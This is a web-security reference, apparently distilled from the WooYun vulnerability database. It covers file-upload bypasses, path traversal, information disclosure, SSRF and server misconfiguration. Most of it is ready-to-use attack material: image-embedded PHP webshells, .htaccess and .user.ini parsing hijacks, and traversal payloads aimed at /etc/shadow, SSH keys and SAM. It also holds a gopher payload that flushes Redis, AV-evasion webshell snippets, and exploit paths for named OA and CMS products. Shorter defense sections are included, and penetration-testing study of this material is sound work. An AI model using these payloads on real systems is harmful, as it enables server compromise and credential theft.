# Web File and Infrastructure Security

> **Source**: distilled from 88,636 real vulnerability cases in the WooYun database, covering three areas: file upload (2,711 cases), file traversal/download (50 in-depth analyses), and information disclosure (7,337 cases).
> **Methodology**: WooYun vulnerability-essence formula + an INTJ-style systematic analysis framework

---

## 1. File-Upload Vulnerabilities

### 1.1 Nature of the Vulnerability

```
Attack chain: find the upload point → bypass detection → obtain the path → exploit parsing → run the webshell
Success rate = P(bypass detection) × P(obtain the path) × P(parse and run)
```

Core tension: functional need (allow uploads) vs security need (restrict execution). Most defenses focus only on "bypass detection" and ignore path disclosure and parsing configuration.

### 1.2 Upload-Point Identification

| Upload-point type | frequency | risk | typical path |
|-----------|------|------|---------|
| Rich-text editor | 42% | very high | `/fckeditor/`, `/ewebeditor/`, `/ueditor/` |
| Avatar upload | 18% | high | `/upload/avatar/`, `/member/uploadfile/` |
| Attachments/documents | 15% | high | `/uploads/`, `/attachment/` |
| Admin features | 12% | very high | `/admin/upload/`, `/system/upload/` |
| Import feature | 5% | high | `/import/`, `/excelUpload/` |

Editor test paths:

| Editor | test path | upload endpoint |
|-------|---------|---------|
| FCKeditor | `/FCKeditor/editor/filemanager/browser/default/connectors/test.html` | `/connectors/jsp/connector` |
| eWebEditor | `/ewebeditor/admin/default.jsp` | `/uploadfile/` |
| UEditor | `/ueditor/controller.jsp?action=config` | `/ueditor/controller.jsp` |

### 1.3 Bypass Techniques - Extension

Blacklist-bypass quick reference:

| Technique | PHP | ASP/ASPX | JSP |
|-----|-----|----------|-----|
| Case | `.Php .pHp` | `.Asp .aSp` | `.Jsp .jSp` |
| Double-write | `.pphphp` | `.asaspp` | `.jsjspp` |
| Special suffixes | `.php3 .php5 .phtml .phar` | `.asa .cer .cdx` | `.jspx .jspa` |
| Space/dot | `.php .` | `.asp.` | `.jsp.` |
| ::$DATA | N/A | `.asp::$DATA` | N/A |
| %00 truncation | `.php%00.jpg` | `.asp%00.jpg` | `.jsp%00.jpg` |
| Semicolon (IIS) | N/A | `.asp;.jpg` | N/A |
| Newline (Apache) | `.php\x0a` | N/A | N/A |

Whitelist-bypass methods:

| Technique | principle | condition |
|-----|------|------|
| Parsing vulnerability | upload a whitelisted file that gets parsed specially | IIS/Apache/Nginx vulnerabilities |
| Apache multi-suffix | `shell.php.jpg` is parsed as php | Apache multi-suffix config |
| %00 truncation | `shell.php%00.jpg` | PHP < 5.3.4 |
| Config-file upload | upload `.htaccess`/`.user.ini` | txt/config files are allowed |
| Image-webshell + LFI | upload an image-embedded webshell combined with file inclusion | an LFI vulnerability exists |

### 1.4 Bypass Techniques - MIME/Content-Type

```
Change the Content-Type to one of the following to bypass:
image/jpeg | image/gif | image/png | image/bmp
application/octet-stream (generic)

Burp intercept-and-modify example:
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg    <-- key modification point
```

### 1.5 Bypass Techniques - File Header / Content Detection

Common file magic numbers:

| Type | magic number (hex) | ASCII |
|-----|-------------------|-------|
| JPEG | `FF D8 FF` | no readable ASCII |
| PNG | `89 50 4E 47` | .PNG |
| GIF | `47 49 46 38` | GIF8 |
| BMP | `42 4D` | BM |
| PDF | `25 50 44 46` | %PDF |
| ZIP | `50 4B 03 04` | PK.. |

Crafting an image-embedded webshell:

```bash
# Method 1: simply add a file header
GIF89a<?php system($_POST['cmd']); ?>

# Method 2: merge files
copy /b image.gif+shell.php shell.gif      # Windows
cat image.gif shell.php > shell.gif         # Linux

# Method 3: EXIF injection
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

### 1.6 Web-Server Parsing Vulnerabilities

```
IIS 5.x/6.0:
  Directory parsing: /shell.asp/1.jpg     -> parsed as ASP
  File parsing: shell.asp;.jpg       -> parsed as ASP
  Malformed parsing: shell.asp.jpg        -> may be parsed as ASP

Apache:
  Multi-suffix: shell.php.xxx          -> parsed right-to-left
  .htaccess: AddType application/x-httpd-php .jpg
  Newline parsing: shell.php%0a         -> CVE-2017-15715

Nginx:
  Malformed parsing: /1.jpg/shell.php     -> cgi.fix_pathinfo=1
  Null byte: shell.jpg%00.php       -> old-version vulnerability

Tomcat:
  PUT method: PUT /shell.jsp/       -> CVE-2017-12615
```

### 1.7 Config-File Parsing Hijack

```apache
# .htaccess: make jpg be parsed as PHP
<FilesMatch "\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

```ini
# .user.ini (PHP-FPM): auto-include the image-embedded webshell
auto_prepend_file=/var/www/html/uploads/shell.jpg
```

```xml
<!-- web.config (IIS): make jpg be handled by FastCGI -->
<handlers>
  <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule"
       scriptProcessor="C:\php\php-cgi.exe" resourceType="Unspecified" />
</handlers>
```

### 1.8 Race-Condition Exploitation

```
Principle: there is a time gap between upload and deletion
Exploitation: multi-threaded upload + access, run malicious code before deletion
Tip: have the malicious file first create a new file elsewhere, so the new file is not removed by the cleanup mechanism
```

### 1.9 Defenses

1. Whitelist validation: allow only specific extensions (`.jpg .png .gif .pdf`)
2. Multi-layer validation: extension + MIME (finfo_file) + file header + getimagesize()
3. File renaming: `uniqid() + fixed extension`, completely removing the original file name
4. Forbid execution: deny script-execution permission on the upload directory
5. Least privilege: `chmod 0644`, not executable by the web user
6. Check before store: validate before storing, using atomic operations to prevent races
7. Path hiding: do not return the full path; use a CDN or randomized URLs

---

## 2. File Traversal and File Inclusion

### 2.1 Nature of the Vulnerability

```
User-input space -> [trust boundary fails] -> filesystem space
Core: the developer assumes "user input = filename", while the attacker exploits "user input = a path instruction"
```

### 2.2 Vulnerable-Parameter Identification

High-frequency parameter names (by frequency):

```
File-related: filename, filepath, path, file, filePath, hdfile, inputFile
Download-related: download, down, attachment, attach, doc
Read-related: read, load, get, fetch, open, input
Template-related: template, tpl, page, include, temp
Generic: url, src, dir, folder, resource, name
```

High-risk feature points (top 5):
1. File-download endpoints (27 times) - `down.php, download.jsp`
2. File-preview features (17 times) - `view.php, preview.jsp`
3. Attachment management (6 times) - `attachment.php`
4. Image loading (5 times) - `pic.php, image.jsp`
5. Log viewing (4 times) - `log.php, viewlog.jsp`

### 2.3 Directory-Traversal Payloads

Basic traversal:

```bash
../                          # Linux standard
..\..\                       # Windows standard
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

Encoding bypass:

```bash
# Single URL encoding
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# Double URL encoding
%252e%252e%252f  |  ..%252f

# Unicode/UTF-8 overlong encoding (GlassFish-specific)
%c0%ae%c0%ae/%c0%af

# Mixed encoding
..%2f  |  %2e%2e/  |  ..%c0%af
```

Special bypasses:

```bash
# Null-byte truncation (PHP<5.3.4 / old Java versions)
../../../etc/passwd%00.jpg

# Question-mark truncation
../../../WEB-INF/web.xml%3f

# Path confusion
....//  |  ....\/  |  ..\/  |  ./../../

# Absolute-path / protocol bypass
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 Sensitive-File-Path Quick Reference

Linux systems:

```bash
/etc/passwd                    # user list (preferred for verification)
/etc/shadow                    # password hashes
/etc/hosts                     # host mappings
/root/.ssh/id_rsa              # SSH private key
/root/.bash_history            # command history
/proc/self/environ             # process environment variables
/etc/nginx/nginx.conf          # Nginx config
/etc/my.cnf                    # MySQL config
```

Windows systems:

```bash
C:\windows\win.ini             # system config (preferred for verification)
C:\boot.ini                    # boot config (XP/2003)
C:\inetpub\wwwroot\web.config  # IIS application config
C:\windows\system32\config\sam # SAM database
```

Java Web:

```bash
WEB-INF/web.xml                         # core config (preferred for verification)
WEB-INF/classes/jdbc.properties          # database config
WEB-INF/classes/applicationContext.xml   # Spring config
WEB-INF/classes/hibernate.cfg.xml        # Hibernate config
```

PHP applications:

```bash
config.php | config.inc.php | db.php | conn.php    # common config
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # core config (includes connection strings)
../web.config              # parent-directory config
```

### 2.5 Defenses

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. Path normalization
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. Verify it is within the allowed directory
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. Whitelist the extension
    # 4. Verify the file exists
    return full_path
```

Key principles: path normalization (realpath/normpath) -> directory-boundary check -> whitelist validation -> run with least privilege

---

## 3. Information Disclosure

### 3.1 Nature of the Vulnerability

```
Nature of information disclosure: attack-surface exposure -> broken trust chain -> deep penetration
Pattern: one leak point can collapse the entire trust chain
      Source -> config -> database -> internal network -> fully compromised
```

### 3.2 Sensitive-File-Path Dictionary

Version-control disclosure:

```bash
# Git leak (highest detection priority)
/.git/config          # contains the remote-repo address
/.git/HEAD            # current branch
/.git/index           # staging-area index
/.git/logs/HEAD       # operation log

# SVN leak
/.svn/entries         # SVN 1.6 and below
/.svn/wc.db           # SVN 1.7+ SQLite database

# Tools: dvcs-ripper, GitHack, svn-extractor
```

Backup-file disclosure:

```bash
# Archive backups (530 hits)
/wwwroot.rar | /www.zip | /web.rar | /backup.zip | /site.tar.gz
/{domain}.zip | /{domain}.rar

# SQL backups (136 hits)
/backup.sql | /database.sql | /db.sql | /dump.sql

# Config backups (101 hits)
/config.php.bak | /web.config.bak | /.env.bak
/config_global.php.bak
```

Config-file disclosure:

```bash
# Generic
/.env | /.env.local | /.env.production
/config.yml | /config.json | /appsettings.json

# PHP
/config.php | /include/config.php | /data/config.php

# Java/Spring
/WEB-INF/web.xml | /WEB-INF/classes/application.properties
/WEB-INF/classes/jdbc.properties

# .NET
/web.config | /connectionStrings.config
```

Probe/debug/log files:

```bash
# Probe files
/phpinfo.php | /info.php | /test.php | /probe.php

# Log files
/ctp.log | /logs/ctp.log | /debug.log | /storage/logs/

# Admin interface
/phpmyadmin/ | /pma/ | /adminer.php
/swagger-ui.html | /api-docs
/actuator/env                    # Spring Boot
```

### 3.3 Probing Methodology

```
Phase 1 passive collection: response headers (Server/X-Powered-By) -> error pages -> robots.txt -> source comments/JS
Phase 2 targeted probing: version control (.git/.svn) -> backup files (domain/date) -> sensitive paths
Phase 3 search engines: Google Hacking syntax
```

Google Hacking quick reference:

```
site:target.com filetype:sql | filetype:bak | filetype:zip
site:target.com filetype:env | filetype:log
site:target.com inurl:.git | inurl:.svn
site:target.com inurl:phpinfo | intitle:phpinfo
site:target.com "db_password" | "mysql_connect"
```

### 3.4 Information-Exploitation Chain

```
Source leak   -> config files -> database credentials -> database takeover -> server privilege escalation
Version control   -> source audit -> SQL injection, etc.  -> admin access   -> file-upload getshell
Config leak   -> DB connection string -> database    -> user data   -> business takeover
Log leak   -> session  -> identity hijack  -> business data   -> lateral movement
API endpoint  -> credentials/passwords -> decryption -> bulk control -> full compromise
Third-party credentials -> SMS/OSS -> verification code    -> account takeover   -> data leak
```

### 3.5 Defenses

Nginx security configuration:

```nginx
location ~ /\.(git|svn|env|htaccess|htpasswd) { deny all; return 404; }
location ~ \.(bak|sql|log|config|ini|yml)$ { deny all; return 404; }
location ~* /(backup|bak|old|temp|test|dev)/ { deny all; return 404; }
autoindex off;
server_tokens off;
```

Apache security configuration:

```apache
<FilesMatch "\.(git|svn|env|bak|sql|log|config)">
    Order Allow,Deny
    Deny from all
</FilesMatch>
Options -Indexes
ServerSignature Off
```

CI/CD integration: scan for sensitive files before deployment -> forbid deploying .git/.svn -> encrypt config files

---

## 4. SSRF and Protocol Abuse

### 4.1 Nature of the Vulnerability

```
Nature of SSRF: the server makes a request on the attacker's behalf, with the attacker controlling the request target
Risk: internal probing -> internal-service access -> file read -> command execution
```

### 4.2 Common Trigger Points

- The url parameter in a file-download feature
- An image-loading/proxy feature
- A web-preview/screenshot feature
- An import-from-URL feature
- A webhook/callback configuration

### 4.3 Protocol Abuse

```bash
# file:// - arbitrary file read
file:///etc/passwd
file:///C:/windows/win.ini

# dict:// - port probing / service interaction
dict://127.0.0.1:6379/info     # Redis
dict://127.0.0.1:11211/stats   # Memcached

# gopher:// - craft arbitrary TCP requests
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall

# http:// - internal-network probing
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/  # cloud metadata
```

### 4.4 Bypass Techniques

```bash
# IP-variation bypass
127.0.0.1 -> 0x7f000001 -> 2130706433 -> 017700000001 -> 127.1
# DNS rebinding: resolve to an external IP then quickly switch to 127.0.0.1
# Short link / 302 redirect: use an external URL to redirect to an internal address
```

### 4.5 Defenses

1. Whitelist restriction: restrict the request's target domain/IP
2. Protocol restriction: allow only http/https
3. Internal isolation: forbid requests to RFC1918 addresses and 127.0.0.1
4. DNS-resolution validation: after resolving, re-check the IP ownership
5. Disable redirects: or limit the redirect count and re-validate

---

## 5. Server Misconfiguration

### 5.1 Parsing Misconfiguration

| Issue | risk | check method |
|-----|------|---------|
| IIS 6.0 parsing vulnerability unpatched | `shell.asp;.jpg` is executable | test by uploading a semicolon-in-name file |
| Nginx cgi.fix_pathinfo=1 | `/img.jpg/.php` is parsed as PHP | upload an image and access `/img.jpg/x.php` |
| Apache multi-suffix parsing | `shell.php.xxx` is parsed | test by uploading a double-extension file |
| Upload directory can execute scripts | a webshell runs directly | test by uploading a script file |
| Directory listing enabled | exposes all files | access the directory URL to view |

### 5.2 Permission Misconfiguration

| Issue | Risk | Fix |
|-----|------|------|
| Web process runs with high privileges | direct root after escalation | run as a low-privilege user |
| Upload directory with 777 permissions | arbitrary write + execute | set 644/755 |
| Readable config file | credential leak | move it out of the web directory, restrict permissions |
| Admin panel without IP restriction | reachable from the internet | IP whitelist / VPN |

### 5.3 Default-Configuration Risks

```bash
# Default admin-panel paths
/admin/ | /manager/ | /console/ | /system/
/phpmyadmin/ | /adminer.php

# Default credentials (high frequency)
admin/admin | admin/123456 | admin/admin123
root/root | test/test

# Default debug ports
8080 (Tomcat) | 9090 (admin) | 3306 (MySQL on the internet)
6379 (Redis without a password) | 27017 (MongoDB without auth)
```

### 5.4 Spring Boot Actuator Leak

```bash
/actuator/env          # environment variables (including passwords)
/actuator/configprops  # configuration properties
/actuator/heapdump     # heap dump (contains sensitive data)
/actuator/mappings     # all URL mappings
```

---

## 6. Comprehensive Field Checklist

### 6.1 File-Upload Testing

- [ ] Scan common editor paths (FCKeditor/eWebEditor/UEditor)
- [ ] Disable JavaScript to test front-end validation
- [ ] Test extension bypass: case/double-write/special suffix/%00 truncation/semicolon truncation
- [ ] Change Content-Type to image/jpeg
- [ ] Add a GIF89a header / craft an image-embedded webshell
- [ ] Identify the server type, test the corresponding parsing vulnerabilities
- [ ] Test .htaccess/.user.ini upload parsing hijack
- [ ] Analyze file-naming rules, test path brute-forcing
- [ ] Test race-condition upload

### 6.2 File-Traversal Testing

- [ ] Identify file-related parameters (filename/path/file/url/download)
- [ ] Basic traversal: `../../../../../etc/passwd`
- [ ] Windows test: `..\..\..\..\..\windows\win.ini`
- [ ] Java Web: `../WEB-INF/web.xml`
- [ ] URL-encoding bypass: `%2e%2e%2f` / double encoding `%252e%252e%252f`
- [ ] Unicode bypass: `%c0%ae%c0%ae/`
- [ ] Null-byte truncation: `../etc/passwd%00.jpg`
- [ ] Absolute path: `/etc/passwd` / `file:///etc/passwd`

### 6.3 Information-Disclosure Scanning

- [ ] Version control: `/.git/config` `/.svn/entries` `/.svn/wc.db`
- [ ] Backup files: `/wwwroot.rar` `/www.zip` `/backup.sql` `/{domain}.zip`
- [ ] Config backups: `/config.php.bak` `/web.config.bak` `/.env.bak`
- [ ] Environment files: `/.env` `/.env.production`
- [ ] Probe files: `/phpinfo.php` `/info.php` `/test.php`
- [ ] Log files: `/ctp.log` `/debug.log` `/storage/logs/`
- [ ] Admin interfaces: `/phpmyadmin/` `/adminer.php` `/swagger-ui.html`
- [ ] Spring Boot: `/actuator/env` `/actuator/heapdump`
- [ ] Assist searching with Google Hacking syntax

### 6.4 SSRF Testing

- [ ] Identify URL/proxy/callback parameters
- [ ] Test file:///etc/passwd protocol read
- [ ] Test internal addresses: http://127.0.0.1:port
- [ ] Cloud metadata: http://169.254.169.254/latest/meta-data/
- [ ] IP-variation bypass: hex/decimal/abbreviated notation
- [ ] DNS rebinding / 302-redirect bypass

---

## Appendix A: High-Risk CMS Vulnerability Quick Reference

| CMS/system | vulnerability type | path | condition |
|---------|---------|------|------|
| Wanhu OA ezOffice | arbitrary upload | `/defaultroot/dragpage/upload.jsp` | %00 truncation |
| Yonyou collaboration platform | arbitrary upload | `/oaerp/ui/sync/excelUpload.jsp` | bypass JS + brute-force the filename |
| Kingdee GSiS | arbitrary upload | `/kdgs/core/upload/upload.jsp` | registered user |
| Jinzhi Education epstar | file traversal | `/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml` | no authentication required |
| Seeyon OA | log leak | `/ctp.log` | direct access |

## Appendix B: Webshell AV-Evasion Quick Reference

```php
$a = 'as'.'sert'; $a($_POST['x']);                    // variable concatenation
array_map('ass'.'ert', array($_POST['x']));            // callback function
$f = create_function('', $_POST['x']); $f();           // dynamic function
set_exception_handler('system');                        // exception handling
throw new Exception($_POST['cmd']);
```

## Appendix C: Common Vulnerability URL Patterns

```bash
# PHP file traversal
/down.php?filename=../../../etc/passwd
/pic.php?url=[base64-encoded path]

# JSP file traversal
/download.jsp?path=../WEB-INF/web.xml
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPX file traversal
/DownLoad.aspx?Accessory=../web.config
/download.ashx?file=../../../web.config

# Resin-specific
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

> **Supply chain / cloud deployment / framework CVEs** → moved to [web-deployment-security.md](web-deployment-security.md)
> **CORS/GraphQL/HTTP smuggling/WebSocket/OAuth** → moved to [web-modern-protocols.md](web-modern-protocols.md)

*Distilled from the WooYun vulnerability database (88,636 entries) | For security research and defense reference only*
